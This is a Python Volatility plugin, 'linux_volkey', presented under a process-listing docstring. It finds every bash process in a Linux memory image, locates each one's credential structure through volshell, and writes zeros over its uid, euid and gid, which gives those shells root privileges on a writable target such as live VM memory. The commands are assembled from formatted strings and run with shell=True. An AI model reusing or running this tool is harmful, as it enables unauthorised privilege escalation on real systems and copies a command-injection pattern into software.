import struct
import sys
import volatility.plugins.common as common 
import volatility.win32 as win32
import volatility.utils as utils
import volatility.obj as obj
import volatility.plugins.taskmods as taskmods
import volatility.plugins.linux.common as linux_common
import subprocess as sp
import re
from volatility.renderers import TreeGrid
from volatility.renderers.basic import Address


class linux_volkey(linux_common.AbstractLinuxCommand):
    """Gather active tasks by walking the task_struct->task list"""

    def _get_cred_offsets_brute(self, pid):
        _prof = self._config.PROFILE
        _loc = self._config.LOCATION[7::]
        '''return dict containing uid and euid mem locations '''
        cmd = 'printf \"cc(pid={pid}); dt(\\\"cred\\\",proc().cred)\" | python vol.py --profile={prof} -f {loc} linux_volshell'.format(pid=pid, prof=_prof,loc=_loc)
        res = sp.check_output(cmd,shell=True)
        rtn = {}
        rtn['pid'] = str(pid)
        u = re.compile('\\b\uid\\b')
        e = re.compile('\\b\euid\\b')
        g = re.compile('\\b\gid\\b')
        for line in res.split('\n'):
            if u.search(line):
                rtn['uid'] = line.split()[3]
            if e.search(line):
                rtn['euid'] = line.split()[3]
            if g.search(line):
                rtn['gid'] = line.split()[3]
        return rtn

    def _overwrite_UIDs(self,IDs):
        uid = IDs['uid']
        euid = IDs['euid']
        pid = IDs['pid']
        gid = IDs['gid']
        _prof = self._config.PROFILE
        _loc = self._config.LOCATION[7::]
        zeros = '\\x00\\x00\\x00\\x00'
        cmd = 'printf \"Yes, I want to enable write support\nself._addrspace.write({uid},\'{zeros}\'); self._addrspace.write({euid},\'{zeros}\'); self._addrspace.write({gid},\'{zeros}\')\" | python vol.py --profile={prof} -f {loc} linux_volshell --write'.format(uid=uid,zeros=zeros,euid=euid, prof=_prof,loc=_loc, pid=pid, gid=gid)
        res = sp.check_output(cmd,shell=True)
        print res
        rtn = True
        return rtn


    def __init__(self, config, *args, **kwargs):
        linux_common.AbstractLinuxCommand.__init__(self, config, *args, **kwargs)
        config.add_option('PID', short_option='p', default=None,
                          help='Operate on these Process IDs (comma-separated)',
                          action='store', type='str')

    @staticmethod
    def virtual_process_from_physical_offset(addr_space, offset):
        pspace = utils.load_as(addr_space.get_config(), astype='physical')
        task = obj.Object("task_struct", vm=pspace, offset=offset)
        parent = obj.Object("task_struct", vm=addr_space, offset=task.parent)

        for child in parent.children.list_of_type("task_struct", "sibling"):
            if child.obj_vm.vtop(child.obj_offset) == task.obj_offset:
                return child

        return obj.NoneObject("Unable to bounce back from task_struct->parent->task_struct")

    def allprocs(self):
        linux_common.set_plugin_members(self)

        init_task_addr = self.addr_space.profile.get_symbol("init_task")
        init_task = obj.Object("task_struct", vm=self.addr_space, offset=init_task_addr)

        # walk the ->tasks list, note that this will *not* display "swapper"
        for task in init_task.tasks:
            yield task

    def calculate(self):
        linux_common.set_plugin_members(self)

        pidlist = self._config.PID
        if pidlist:
            pidlist = [int(p) for p in self._config.PID.split(',')]

        for task in self.allprocs():
            if not pidlist or task.pid in pidlist:
                yield task

    def unified_output(self, data):
        return TreeGrid([("Offset", Address),
                         ("Name", str),
                         ("Pid", int),
                         ("Uid", str),
                         ("Gid", str),
                         ("DTB", Address),
                         ("StartTime", str)],
                        self.generator(data))

    def _get_task_vals(self, task):
        if task.parent.is_valid():
            ppid = str(task.parent.pid)
        else:
            ppid = "-"

        uid = task.uid
        if uid == None or uid > 10000:
            uid = "-"

        gid = task.gid
        if gid == None or gid > 100000:
            gid = "-"

        start_time = task.get_task_start_time()
        if start_time == None:
            start_time = "-"

        if task.mm.pgd == None:
            dtb = task.mm.pgd
        else:
            dtb = self.addr_space.vtop(task.mm.pgd) or task.mm.pgd

        task_offset = None
        if hasattr(self, "wants_physical") and task.obj_vm.base:
            task_offset = self.addr_space.vtop(task.obj_offset)

        if task_offset == None:
            task_offset = task.obj_offset

        return task_offset, dtb, ppid, uid, gid, str(start_time)

    def generator(self, data):
        for task in data:
            task_offset, dtb, ppid, uid, gid, start_time = self._get_task_vals(task)
            yield (0, [Address(task_offset),
                       str(task.comm),
                       int(task.pid),
                       str(uid),
                       str(gid),
                       Address(dtb),
                       start_time])


    def render_text(self, outfd, data):
        self.table_header(outfd, [("Offset", "[addrpad]"),
                                  ("Name", "20"),
                                  ("Pid", "15"),
                                  ("PPid", "15"),
                                  ("Uid", "15"),
                                  ("Gid", "6"),
                                  ("DTB", "[addrpad]"),
                                  ("Start Time", "")])
        for task in data:
            task_offset, dtb, ppid, uid, gid, start_time = self._get_task_vals(task)
            """do pslist and only print if the name of the process is bash"""
            if task.comm == "bash":
                self.table_row(outfd, task_offset,
                               task.comm,
                               str(task.pid),
                               str(ppid),
                               str(uid),
                               str(gid),
                               dtb,
                               str(start_time))
                vals = self._get_cred_offsets_brute(task.pid)
                success = self._overwrite_UIDs(vals)


	
